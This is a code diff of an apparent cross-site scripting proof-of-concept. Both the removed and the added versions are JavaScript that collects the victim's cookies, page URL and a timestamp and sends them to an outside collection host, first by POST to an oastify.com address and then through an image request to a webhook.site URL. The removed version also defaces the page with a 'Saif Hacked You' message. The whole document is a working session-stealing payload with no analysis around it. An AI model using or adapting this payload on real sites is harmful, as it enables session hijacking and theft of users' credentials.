@@ -1,14 +1,5 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>PoC Login Page</title>
-</head>
-<body>
-  <h1>Please wait...</h1>
-
-  <script>
-    (function() {
-      let data = `
+<script>
+let data = btoa(`
 🍪 Cookies:
 ${document.cookie}
 
@@ -23,27 +14,9 @@ ${location.href}
 
 ⏰ Time:
 ${new Date().toISOString()}
-      `;
+`);
 
-      fetch("https://49bbd7txft39oifsb6nt7p39v01rphd6.oastify.com", {
-        method: "POST",
-        headers: { "Content-Type": "text/plain" },
-        body: data
-      })
-      .then(() => {
-        alert("XSS triggered and data sent!");
-        document.body.innerHTML = `
-          <div style="padding: 30px; font-family: monospace; font-size: 1.5em; color: #0f0; background-color: #111; min-height: 100vh; display: flex; justify-content: center; align-items: center; text-align: center; flex-direction: column;">
-            <div>👾 Saif Hacked You 👾</div>
-            <div style="margin-top: 20px; font-size: 0.7em; color: #afa;">Your session has been terminated.</div>
-          </div>
-        `;
-      })
-      .catch(() => {
-        // لو حصل خطأ في الإرسال، نعرض alert برضه
-        alert("XSS triggered but failed to send data!");
-      });
-    })();
-  </script>
-</body>
-</html>
+new Image().src = "https://webhook.site/323bd404-2b33-4438-93b4-81f85ccc77cb?data=" + data;
+
+alert("👾 XSS Triggered!");
+</script>
